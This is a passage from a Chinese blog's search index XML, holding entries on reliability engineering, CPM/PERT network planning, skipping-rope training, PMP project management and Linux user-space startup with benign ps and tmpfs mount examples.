<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[可靠性工程 | Overview of Reliability]]></title>
    <url>%2F2020%2F01%2F02%2FEngineering-RAMS%2F</url>
    <content type="text"><![CDATA[摘要RAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。 BackgroundRAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。 History西北欧工业事故概念失效 vs 故障 vs 误差定义：IEC50(1990) 失效（Failures）失效（Failures）定义，当产品单元的规定功能不能完成时（超过可接受范围），产品单元发生失效。 故障（Faults）故障（Faults）是指没有能力完成规定功能时产品单元的状态，这种状态不包括在预防性维修和定时维修时产品不能工作的状态，也不包括缺少外部资源引起不能工作的状态。 误差（Errors）Best Practice 可靠性理论最佳实践 可靠性设计 安全性设计 风险评估 工艺管理与控制 成熟度 Best Practice | 可靠性理论最佳实践：失效分析Best Practice | 可靠性理论最佳实践：可靠性设计Best Practice | 可靠性理论最佳实践：安全性设计Best Practice | 可靠性理论最佳实践：风险评估推荐阅读NTNU PPT 《System Reliability Theory》PPT 《Reliability of Safety-Critical Systems》PPT 《Risk Assessmen: Theory, Methods, and Applications》PPT 《Risikoanalyse. Teori og metoder》PPT 《风险评估：理论、方法与应用》《风险评估：理论、方法与应用》简介 西方发达国家，尤其是西北欧国家，在经历了20世纪70年代和80年代一系列惨痛的工业事故之后，就一直把工业安全和事故预防的问题放在重中之重的地位，并大范围推广风险评估技术和方法，也对此进行了大量的探索和研究。所有的这些成果都会对解决中国日益严重的技术安全问题有巨大的帮助。 资源研究机构挪威科技大学(Norwegian University of Science and Technology，简称 NTNU)挪威科技大学是挪威工程学与工业技术的研究中心。为挪威及世界各地区培养了大批量的高素质工程师，造船，石油，渔业，医学，计算机技术及纳米技术学科属于世界顶尖，曾有五位校友获得诺贝尔奖；挪威科技大学最早历史可以追溯到1760年成立的特隆赫姆学会，该学会于1767年受到挪威皇室的认可，进而改名为挪威皇家科学与文学学会，1996年，挪威理工学院与特隆赫姆艺术科学学院、自然历史和考古博物馆合并组成挪威科技大学。 中国北方车辆研究所(中国兵器201所)中国坦克装甲车辆总体研制单位和兵器地面无人平台研发中心。 部分研究者 挪威科技大学 Marvin Rausand 教授/马文·拉桑德 Competence/interests: System reliability theory Reliability, Availability, Maintainability, and Safety (RAMS) analysis Risk analysis Reliability Centered Maintenance (RCM) Reliability assessment of oil/gas subsea and well equipment Probabilistic modeling Books: Rausand, M.: “Reliability of Safety-Critical Systems: Theory and Applications,” Wiley, Hoboken, NJ ,2014. Rausand, M.: “Risk Assessment: Theory, Methods, and Applications,” Wiley, Hoboken, 2011.[This book has been translated to Chinese and is published by Tsinghua University Press, 2013] Rausand, M. and Utne, I. B.: “Risikoanalyse - Teori og metoder”, Tapir akademisk forlag, Trondheim, 2009 (In Norwegian). Murthy, D. N. P., Rausand, M. and Østerås, T.: “Product Reliability: Specification and Performance”, Springer, London, 2008.[This book is currently (i.e., 2013) being translated to Chinese.] Rausand, M. and Høyland, A.: “System Reliability Theory: Models, Statistical methods, and Applications” (2nd ed.), Wiley, Hoboken, 2004. [This book has been translated to Chinese and is published by the National Defense Industry Press, 2010] 挪威科技大学 刘一骝 副教授 挪威科技大学 Arvid Naess 教授研究兴趣主要包括数理统计、极值概率、可靠性理论、海洋波统计、民用工程等。 浙江大学建筑工程学院/金伟良教授研究方向：工程结构可靠度、混凝土结构基本性能（含耐久性、长期性能） 电子科技大学机电学院/黄洪钟教授研究方向：1. 可靠性设计；2. 状态监测、故障诊断与寿命预测；3. 人工智能与优化设计；4. 数字化设计与智能制造 东北大学张义民教授提出了机械装备的动态和渐变可靠性设计、可靠性优化设计、可靠性灵敏度设计和可靠性稳健设计等成组理论与技术等，应用于压缩机、车辆、重矿机械、机床、发动机等行业。 资质认证 ASQ CRE：美国ASQ的注册可靠性工程师认证。 TÜV Functional Safety：德国TÜV的功能安全认证。包括： 南德 Functional Safety Certified Professional 北德 Functional Safety Certified Engineer/Coordinator/Manager 莱茵 Functional Safety Engineer INCOSE ASEP/CSEP/ESEP：美国INCOSE的系统工程师认证。 专业组织 IEEE Reliability Society：IEEE 可靠性分会。 ASQ Reliability Division：英文详见 http://www.asqrd.org中文详见 https://accendoreliability.com/webinars INCOSE：涵盖了系统工程的多方面内容，有时会跟RAMS有交集。 学术会议ESREL（European Safety and Reliability Conference，欧洲安全性和可靠性会议）2018年6月在挪威特隆赫姆（Trondheim）举行，由挪威科技大学（NTNU）承办。ESREL 2018 会议的主题是“不断变化的世界中的安全社会”。会议目标是推动理解，建模、分析并管理在风险，安全和可靠性领域的复杂性问题，这些领域体现在我们世界的现在和未来。并寻求建立一个多学科平台，以解决这些领域的技术，社会等问题。 RAMSRAMS领域的年度盛会。2018年1月在美国内华达州（Nevada）举行。 ICRSE（International Conference on Reliability Systems Engineering，国际可靠性系统工程会议）2017年7月中旬在北京举行，由北京航空航天大学承办。 案例 头条丨国家核安全局通报秦山核电厂1号机组停堆运行事件 京广线列车脱轨事故原因公布：司机瞭望距离不足，停车不及撞上滑坡山体 深思：江西丰城电厂三期EPC特大事故 参考文献 中国兵器工业集团 记全国技术能手、中国兵器北重集团数控设备维修领域人才李松 RAMS工程师职业发展的个人建议 挪威科技大学刘一骝教授到计算机与通信工程系访问 南方电网公司反事故措施（2020版）]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Policy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:网络计划技术|工具与技术]]></title>
    <url>%2F2019%2F05%2F29%2FProject-Tech-NetworkPlanning%2F</url>
    <content type="text"><![CDATA[摘要 BackgroundQuestionTheoryHistory网络计划技术是一种用于工程项目计划与控制的管理技术。起源于五十年代末发展起来的关键路径法（CPM）与计划评审法（PERT）。鉴于技术起源和设计目的，业内一般将 CPM 应用于已取得一定经验的承包工程，而研究与开发项目则更多地应用 PERT 。 工具 起源 时间 成本 质量 费用 甘特图 关键路径法/CPM 1957，美国杜邦公司/兰德公司 weak strong weak strong 技术评审技术/PERT 1958，美国海军/洛克希德，潜射核导弹 strong weak strong weak 甘特图（Gantt Chart）发明人：亨利 ·甘特(Henry Gatt) 关键路径法(Critical Path Method,CPM)关键路径法（CPM）是由美国杜邦公司和兰德公司与1957年联合研究提出的，它假设每项活动的作业时间是确定值，重点在于费用和成本的控制。 计划评审技术(Project Evaluation and Review Technique,PERT)项目评估与审查技术（Project Evaluation and Review Technique,PERT）由美国海军首次提出，并于1958年由 Booz、Allen 和 Hamilton 的咨询公司开发。最早的用途是协调涉及北极星导弹研发计划的 10 000 多个分包商的活动。PERT 类似关键路径方法(CPM)，是一种用于优化和调度复杂的、相关关联的活动的方法。 Introduction | 网络计划技术简介网络计划技术（Network Planning Technology） Core Concept | 核心概念Concept 网络图网络图是指网络计划技术的图解模型，反映整个工程任务的分解和合成。 Concept 时间参数各项工作中反映人、事、物运动状态的时间参数包括： 作业时间 开工与完工的时间 工作之间的衔接时间 完成任务的机动时间 工程范围 总工期 Concept 关键路线在关键路线上的作业称为关键作业，这些作业完成的快慢直接影响着整个计划的工期。在计划执行过程中关键作业是管理的重点，在时间和费用方面则要严格控制。 Concept 网络优化网络优化是指根据关键路线法，通过利用时差，不断改善网络计划的初始方案，在满足一定的约束条件下，寻求管理目标达到最优化的计划方案。 实施步骤网络计划技术的应用主要遵循以下几个步骤： 1、确定目标； 2、分解工程项目，列出作业明细表； 3、绘制网络图，进行结点编号；主要方法：1）顺推法（起始时间开始）；2）逆推法（从终点时间开始） 4、计算网络时间，确定关键路线；根据网络图和各项活动的作业时间计算出全部网络时间和时差，并确定关键线路。在实际工作中，作业种类多、影响计划的因素也很多，因此通常需要依靠计算机对计划进行调整。 5、网络计划方案优化；根据关键路径，综合平衡总工期、人力资源、物资供应、成本费用等情况，制定最优方案。正式绘制网络图，编制进度表以及工程预算等计划文件。 6、网络计划执行 作业名称 作业代号 作业时间 紧前时间 紧后时间 Best Practice | 最佳实践Microsoft Office ProjectOmniGroup OmniPlanFuture：Beyond the Network阅读作业拓展阅读项目管理 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 北极星导弹项目主页 如何有效使用Project（1）——编制进度计划、保存基准]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[战斗体能训练:跳绳]]></title>
    <url>%2F2019%2F05%2F19%2FPHT-Skipping%2F</url>
    <content type="text"><![CDATA[摘要 人的终极关怀应该是寻找到一种自我与周遭环境的融洽方式。—— RiboseYim 跳绳是一种古老的娱乐活动 跳绳是一项很有效的有氧运动 跳绳是拳击运动员的常规训练科目 新时代生存难度系数：中考竞赛科目 Overview跳绳是一种古老的娱乐活动。唐朝称“透索”，宋称“跳索”，明称“跳百索”、“跳白索”、“跳马索”，清称“绳飞”，清末以后跳绳称作“跳绳”。跳绳是一项极佳的运动项目，能有效训练个人的反应和耐力。 跳绳是一项很有效的有氧运动，从运动量来说，持续跳绳10分钟，与慢跑30分钟相差无几，可谓是一项耗时少、耗能大的有氧运动。跳绳能增强人体心血管、呼吸和神经系统的功能。 跳绳可以结实全身肌肉，消除臀部和大腿上的多余脂肪并能使动作敏捷、稳定身体的重心。跳绳训练人的弹跳、速度、平衡、耐力和爆发力，同时可培养准确性、灵活性、协调性。 注意事项： 跳绳前热身10分钟。 运动时选择场地或穿减震鞋。 运动后注意拉伸降温和放松。 禁忌：心脏、高血压等疾病或严重疾病康复。 基本技巧： 俗语说：“摇绳练臂力，跳绳练腿劲；快摇练速度”。 基础跳绳：双脚稍微分开并同时跳跃避开绳子的方式。 交互跳绳：双脚交互跳跃避开绳子的跳绳方式。这种技巧在每分钟跳绳的次数是上面基础技巧的两倍。 纵横交错：这种方式与基础跳绳相似，唯一不同的是在跳跃时左手置于身体的右边而右手则置于身体的左边。 双摇跳：在跳双摇跳时，跳绳者需比一般的跳绳方式的跳跃高度跳得稍高一点点，让绳子两次在脚下经过，一些跳绳高手更可让绳子在脚下经过三次。事实上在跳绳比赛中，三次、四次和甚至五次并不罕见。在美国的跳绳比赛中，年龄大于15岁的男性须有能力做200次以上的三摇跳。 花式跳绳： 联合跳跃：这是由两种或以上不同的跳绳技巧联合为一个花式的跳绳花式。 交叉握腿跳：腿下X是一个复杂的花式，跳绳者需将左手置于右脚下，右手置于左脚下。 “滑雪跳”：把双腿保持紧紧贴在一起，然后不断左右跳动。 “并脚前后跳”：把双腿保持紧紧贴在一起，然后不断前后跳动。 “剪刀脚跳”：把双脚不断前后交替地跳动。 “分腿弹跳”：不断把双脚分开合上跳动。 “肯肯跳”：把膝盖提高，作单脚跳。 战斗体能训练：以拳击运动为例跳绳是拳击运动员的常规训练科目。 跳绳可以提高运动员小腿肌肉耐力，适应比赛中高强度的移动。提高步法的灵活性，左右交替跳绳可以使脚步更灵活，培养更好的节奏感。 拳击运动员常用的几种步法： (1)拳击步跳 除两臂外，身体各部姿势基本和拳击基本姿势相同，两脚距离前后约一步，左右约一肩，脚跟提起，脚掌着地。跳跃时两手握绳，两腕摇动.屈肘贴身，摇绳一次，两脚同时起跳一次，脚离地面不宜过高。 跳跃中，两脚可同时支撑体重。也可一脚或两脚交替支撑体重。一脚支撑体重时，另一脚虚点地同时起落。跳跃中还可以前、后、左、右移动位置。拳击步跳绳是拳击运动专项辅助练习的常用跳法。 练习时可根据训练目的，采用慢速跳、快速跳、变速跳、定次跳、定时跳等多种形式进行。 (2)两脚交换跳 两手正摇，当绳将要转至脚前时，先提起一脚，另一脚随即弹起跟着越绳落地.使两脚交换越绳。 (3)高抬腿跳 与原地高抬腿跑相似，即两足平行站立，一腿支撑体重，一腿屈膝高抬。练习时，支撑体重的腿要尽力蹬直。屈膝高抬的腿要尽力提起，一伸一屈，交替进行.上体正直.切勿后仰，这一跳法，有利腹部及大腿肌肉的增强，培养顽强的意志品质。 (4)双摇跳 这种跳法是脚离地一次，绳过脚两次，宜用双脚并立姿势。跳跃时要求两脚尽力蹬地，落地时两膝徽屈缓冲。以腕摇绳，注意速度和节奏。这一练习有利于腿部力量和体力、耐力的增强。 经济社会指数：中考难度竞赛跳绳运动是近年来官方推广的教学竞赛科目。由于跳绳对场地的要求极低，工具简单且能够快速上手，一直是官方背书大力推广的全民健身运动。 1959年，陕西师大举办了中国第一个“跳绳培训班”，开始并对跳绳运动进行系统的整理和规范，创立了跳绳运动大赛。2013年，《国家学生体质健康标准》测试表正式将一分钟单摇双脚跳绳列为测试项目，小学一至六年级和初中均有该项目。 从近年来各地方政府公布的中考体测标准来看，跳绳在中小学生运动中的地位再被提升，甚至在部分地区矫枉过正、演变成了一种新的应试负担。随着跳绳重要程度的跃升，跳绳装备的讲究也越来越多。各类跳绳课外培训产业也应运而生，从一对一私教到多人拼团抢购，小班教学、大班带课，有些城市一节60分钟的跳绳私教课收费可达400元，这个价位已经可以跟成年人的中档健身房私教课相当。 案例：南京市中考体能测试标准 一分钟跳绳 三分钟跳绳 思考待续 控制论 通信和控制系统的共同特点都包含一个信息交换的过程。概念：内稳定感知-&gt;控制控制系统通过自己的反馈机构可以减少系统的“无组织程度”。 文化传承方式 以美国黑人社区运动歌谣为例 民间武德具有回族特点的踏脚、木球、方棋、掼牛等体育活动。 我国河北沧州一带武德充沛，回族群众流行一种花式跳绳活动（每年秋收罢、场院出清时流行，绳长10米至13米，直径寸余，两人各持一端，同时顺同一方向绕圈摆动，单人、双人或数人在绳子上模仿动物姿态作举、闪、滚、翻、跳跃等动作）。 拓展阅读数据图表 运动指标 体能训练 Physical Training | 美军体能训练观察 Physical Training | 军警体能标准横向评测 Physical Training | 训练项目：跑步 Physical Training | 训练项目：跳绳 Physical Training | 跑步路线推荐 Physical Training | 跑步应用评测 讲武堂 讲武堂|中国传统兵法摘要 外军研究|美军士官制度观察 外军研究|军警体能标准横向评测 外军研究|军队体能标准横向评测 外军研究|美军授勋和嘉奖制度观察 太公分猪肉—香港特区授勋和嘉奖制度批判 参考文献 比辅导作业更可怕的是，教小学生跳绳 | 作者 钟亦可|发布：2019-12-31 20:46:17 2013年初中毕业生升学体育考试内容及评分标准 2019年天津市中考体育跳绳满分标准 一秒跳绳7.3下！广州小学生破两项世界纪录 | 2015-12-10 16:54 来源：澎湃新闻 中国消防员集体跳绳 回族的体育习俗：掼牛、驯鹰、射箭]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>讲武堂</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:项目管理知识体系]]></title>
    <url>%2F2019%2F04%2F30%2FProject-PMP%2F</url>
    <content type="text"><![CDATA[摘要 PMI 项目管理知识体系 美国项目管理协会（Project Management Institute，简写 PMI）成立于1969年，是一个由项目管理专业领域内的研究人员、学者、顾问和经理组成的全球性的专业组织机构。PMP(Project Management Professional)是该协会推出的资格认证。 引论 | Introduction项目的三重制约（triple constraint）在实际的项目管理中，三重制约各要素的优先权不同。 S 范围 S 范围 T 时间 T 时间 Q 质量 Q 质量 C 成本 C 费用 R 资源 R 风险 目标管理（MBO,Management by Objectives）实施目标管理的三个步骤： 1）树立目标（SMART） 具体的 Specific 可衡量的 Measurable 可达到的 Achievable 现实的 Realistic 基于时间的 Timebased 2）定期评估目标可否达到3）采取修正措施 项目管理环境 项目组合 Portfolios : 战略业务目标，相互无关 项目集 Programs : 相互关联 项目 Project 组织级项目管理（OPM） 项目管理逻辑过程项目管理逻辑过程（ITTO）: 输入 Input 工具与技术 Tool &amp; Technology 输出 Output 项目管理生命周期五大项目管理过程组：启动、规划、执行、监控、收尾。 12345678digraph process&#123; Initiating-&gt;Planning; Planning-&gt;Executing; Controlling-&gt;Planning; Controlling-&gt;Executing; Executing-&gt;Controlling; Controlling-&gt;Closing;&#125; 项目管理过程组 | Project Management Process Groups 启动过程组 | Initiating Process Group 规划过程组 | Planning Process Group 执行过程组 | Executing Process Group 监控过程组 | Monitoring and Controlling Process Group 收尾过程组 | Closing Process Group PMP 知识框架 知识领域 启动过程组 规划过程组 执行过程组 监控过程组 收尾过程组 4. 项目整合管理 4.1 制定项目章程 4.2 制定项目管理计划 4.3 指导与管理项目工作 4.4 管理项目知识 4.5 监控项目工作 4.6 实施整体变更控制 4.7 结束项目或阶段 5. 项目范围管理 5.1 规划范围管理 5.2 收集需求 5.3 定义范围 5.4 创建WBS 5.5 确认范围 5.6 控制范围 6. 项目进度管理 6.1 规划进度管理 6.2 定义活动 6.3 排列活动顺序 6.4 估算活动持续时间 6.5 制定进度计划 6.5 控制进度 7. 项目成本管理 7.1 规划成本管理 7.2 估算成本 7.3 制定预算 7.4 控制成本 8. 项目质量管理 8.1 规划质量管理 8.2 管理质量 8.3 控制质量 9. 项目资源管理 9.1 规划资源管理 9.2 估算活动资源 9.3 获取资源 9.4 建设团队 9.5 管理团队 9.6 控制资源 10. 项目沟通管理 10.1 规划沟通管理 10.2 管理沟通 10.3 监督沟通 11. 项目风险管理 11.1 规划风险管理 11.2 识别风险 11.3 实施定性风险分析 11.4 实施定量风险分析 11.5 规划风险应对 11.6 实施风险应对 11.7 监督风险 12. 项目采购管理 12.1 规划采购管理 12.2 实施采购 12.3 控制采购 13. 项目相关方管理 13.1 识别相关方 13.2 规划相关方参与 13.3 管理相关方参与 13.4 监督相关方参与 变更控制系统PMIS -&gt; 配置管理 -&gt; 变更控制 变更控制系统是配置管理系统的一个子系统，包括： 一份变更控制计划：包括在项目管理计划中。 组建 变更控制委员会（CCB，change control board） 批准所有的变更 变更控制流程（如何控制，谁负责） 变更表格 Change forms 报告Reports(里程碑图表，资源使用量) 绩效统计值 项目成功项目成功的判断标准： 按基准完成 在容忍范围内完成 项目运行环境 | The Environment in which Projects Operate事业环境因素 | Enterprise Environment Factors组织过程资产 | Organizational Process Assets组织结构类型 智能型组织（functional organization） 项目型组织（projectized organization） 矩阵型组织（Matrix organization）: strong vs balanced vs weak 协调员 Coordinator (决策) 联络员 Expediter （不决策） 项目经理的角色 | The Role of The Project Manager项目整合管理 | Project Integration Management制定项目章程 输入：商业文件（商业论证）、协议、事业环境因素、组织过程资产 工具与技术：专家判断、数据收集（头脑风暴、焦点小组、访谈）、人际关系与团队技能、会议 输出：项目章程、假设日志 商业论证 Business Case商业论证两大类别： 【数学法】Constrained optimization methods 约束优化法 【比较法】Benefit measurement methods 比较利益法 数学模型: 线性规划 Linear programming 整数规划 Integer programming 动态规划 Dynamic programming 多目标规划 Multi-objective programming 比较利益法： 项目谋杀会议 Murder board : 末位淘汰 同行评审 Peer review : 权责不一致 评分模型 Scoring models Q排序模型 Q-sort 经济学模型 Economic models 选择项目 （￥￥￥） 指标项 含义 对项目含义 项目优先级 项目重要程度代表获取资源的能力 NPV（净现值） IRR（内部收益率） Payback Period（回收期） 收回成本所需时间 BCR（收益成本分析） Benefit(payback) / Cost ROI（投资利润率） SV 进度偏差 0 CV 成本偏差 0 工期绩效指数（SPI） EV/PV &gt;1 进度提前 成本绩效指数（CPI） EV/AC &gt;1 成本节约 PV: Present Value 现值 NPV: Net Present Value 净现值 ；净现值=收益现值-成本现值 项目章程项目计划 （￥￥￥） 基准（Baseline）正式批准的项目管理计划成为基准，变更基准须提出变更请求并经实施整体变更控制过程批准。 项目管理计划特点： 正式 Formal 接受 Bought into 现实 Realistic 批准 Approved 项目会议 开工会（Kickoff Meeting）: 规划结束，执行开始；PM和项目团队 启动会（Initial Meeting）: 启动过程中。客户、发起人、PM 管理项目知识 项目文件 需求管理计划 需求文件 进度管理计划 项目日志（记录问题、假设条件） 成本管理计划 风险登记册 质量管理计划 项目相关方登记册 人力资源计划 沟通管理计划 风险管理计划 采购管理计划 项目相关方管理计划 项目基准 经验教训登记册形成时间、经验教训描述、形成原因、造成影响、解决办法 监控项目工作Focus on Whom 实际绩效：对比项目管理计划；评估是否需要纠正、预防措施 风险：识别、分析、跟踪和监测已有风险 信息库：文档 绩效报告：状态报告、进展测量和预测 监督变更实施情况 监控分析技术 回归分析：根本原因分析 分组方法：预测方法（如时间序列、情景构建、模拟等） 因果分析 失效模式与影响分析（FMEA） 故障树分析（FTA） 储备分析 趋势分析 挣值管理 差异分析 实施整体变更控制Never change is change 永远不变的就是变化： 合理接受变更 严谨管理变更 项目范围管理 | Project Scope Management项目进度管理 | Project Schedule Management项目成本管理 | Project Cost Management项目质量管理 | Project Quality Management项目资源管理 | Project Resource Management项目沟通管理 | Project Communications Management项目风险管理 | Project Risk Management项目采购管理 | Project Procurement Management项目相关方管理 | Project Stakeholder Management工具与技术垂直图表法阅读作业 《PMBOK 项目管理知识体系指南》 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works:User Space]]></title>
    <url>%2F2019%2F04%2F21%2FLinux-Works-User-Space%2F</url>
    <content type="text"><![CDATA[摘要Linux 用户空间启动顺序 How User Space Starts init 必要的低层服务例如：udevd 和 syslog 网络配置 中高层服务例如 ：cron , printing 登录提示、图形界面及其它高层次应用 一号进程init（initialization的简写）是 Unix 和 类Unix 系统中用来产生其它所有进程的程序。它以守护进程的方式存在，其进程号为1。Linux系统在开机时加载Linux内核后，便由Linux内核加载init程序，由init程序完成余下的开机过程，比如加载运行级别，加载服务，引导Shell/图形化界面等等。 123[root@li1437-101 ~]# ps -ef | grep initroot 1 0 0 Feb27 ? 00:03:05 /sbin/initroot 28683 28663 0 02:44 pts/0 00:00:00 grep --color=auto init 123456789// Mac OSbash-3.2$ ps -ef | grep init 0 243 1 0 15 517 ?? 0:00.74 /System/Library/CoreServices/CrashReporterSupportHelper server-init 0 533 1 0 15 517 ?? 0:02.07 /System/Library/CoreServices/SubmitDiagInfo server-init 501 52150 1 0 日01下午 ?? 0:15.49 /usr/libexec/secinitd 0 69864 1 0 11:35上午 ?? 0:00.20 /usr/libexec/secinitd 0 72830 1 0 1:51下午 ?? 0:00.19 /usr/libexec/secinitdDarwin ACA80166.ipt.aol.com 16.5.0 Darwin Kernel Version 16.5.0: Fri Mar 3 16:52:33 PST 2017; root:xnu-3789.51.2~3/RELEASE_X86_64 x86_64bash-3.2$ 在Linux发行版中，init有三种主要的实现形式： System V init: 传统的 systemd: 所有主流Linux发行版中的标准init Upstart: Ubuntu Android 和 BSD （运行存放于’/etc/rc’的初始化 shell 脚本）也有它们自己的init版本，一些发行版也将System V init 修改为类似BSD风格的实现。目前大部分Linux发行版都已采用新的systemd替代System V和Upstart，但systemd向下兼容System V。 System V init: 存在一个启动序列，同一时间只能启动一个任务，这种架构下，很容易解决依赖问题，但是性能方面要受一些影响。systemd is goal oriented. : 针对System V init的不足，systemd所有的服务都并发启动。systemd时基于目标的，需要定义要实现的目标，以及它的依赖项。systemd 将所有过程都抽象为一个配置单元，即 unit。可以认为一个服务是一个配置单元；一个挂载点是一个配置单元。 Upstart is reactionary.:Upstart是基于事件的，Upstart的事件驱动模型允许它以异步方式对生成的事件作出回应。 The Initial RAM filesystemLinux内核不能通过访问PC BIOS 或者 EFI接口从磁盘获取数据，所以为了mount它的root filesystem, 对于底层存储需要驱动程序支持。解决方案是在内核运行之前，由boot loader加载驱动模块及工具到内存。在启动时，内核读取相关模块到一个临时的RAM filesystem(initramfs),挂载在／根目录,initramsfs允许内核为真正的root filesystem加载必要的驱动模块。最后，再挂载真正的root filesystem、启动init。 Linux在很多场景下都需要创建一个基于内存的文件系统，提供一个可以接近零延迟的快速存储区域。目前有两类主要的RAM磁盘可用，她们个有优劣：ramfs和tmpfs。(注意：创建之前可以使用 free 命令查看未使用的RAM) 1234# mkdir /mnt/ramdisk# mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk# vi /etc/fstab#tmpfs /mnt/ramdisk tmpfs nodev,nosuid,noexec,nodiratime,size=1024M 0 0 扩展阅读电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works]]></title>
    <url>%2F2019%2F04%2F21%2FLinux-Works%2F</url>
    <content type="text"><![CDATA[摘要 第一部分 The Big Picture Levels and Layers Hardware The Kernel User and User Space 第二部分 Overview of the Linux Kernel 进程管理 Process Management 内存管理 Memory Management 设备管理 Device Drivers and Management 系统调用 System Calls 用户空间 User Space 用户管理 User Management 第三部分 Application and Development The Desktop The Shell Script The Development Tools Compiling and Building 第四部分 Future 第一部分 The Big PictureLevels and LayersHardwareOverview of the Linux KernelBasic Commands设备管理 Device Drivers and Management磁盘管理 DISKS and Filesystems进程管理 Process Management内存管理 Memory Management系统调用 System Calls用户空间 User Space用户管理 User Management未来 Looking Forward第二部分 Overview of the Linux Kernel一、Basic Commands How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension 二、Files and DirectoryFiles Modes and Permissions Chmod Command Examples Listing and Manipulating ProcessesDirectory HierarchyRunning Commands三、DEVICES 设备管理Devices FilesDevices PathDevices Extend四、DISKS and FileSystems 磁盘管理 How Linux Works：Device and FileSystem Partitioning Disk DevicesFileSystemsSwap SpaceTraditional FileSystemsLooking Forwarding五、How the Linux Kernel Boots How Linux Works：Boots 六、How User Space Starts How Linux Works：用户空间 七、System ConfigurationSystem LoggingUser Management Files /etc/passwd File /etc/shadow File System TimeBatch JobsScheduling TasksUsersUser ID and Users SwitchingUser Identification and Authentication八、System Resource UtilizationIntroduction to Resource MonitoringLoad Averages Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Measuring MemoryMeasuring CPUMeasuring I/OPer-Processes Monitoring九、NetworkNetwork BasicMoving Files across the NetworkrsyncsambaNFSConfiguring Linux as a RouterFirewallsEthernet,IP and ARPWireless Ethernet十、Network Application and ServicesNetwork ServersSSHDiagnostic Tools lsof tcpdump netstat port scanning Remote Procedure Call(RPC)Network Security第三部分 Application and Development一、The Desktop二、Shell Scripts How Linux Works：Shell 三、Development Tools四、Compiling and BuildingCompiling Software From C Source CodeBuilding on the BASIC Web Servers and Application Databasees Virtualization Distributed Computing Embedded Systems 第四部分 FutureTips源码阅读的一般方法 核心子系统（例如进程管理子系统） 结构体、数据结构 关键程序、加载顺序 主题式探索（例如：Linux 支持闰秒吗？） 扩展阅读电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 How to check List users in Linux | Complete Guide for Beginners How To Configure Authenticated NTP Using Symmetric Keys (compatibility with FIPS 140-2)]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:项目管理信息系统]]></title>
    <url>%2F2019%2F04%2F06%2FProject-PMIS%2F</url>
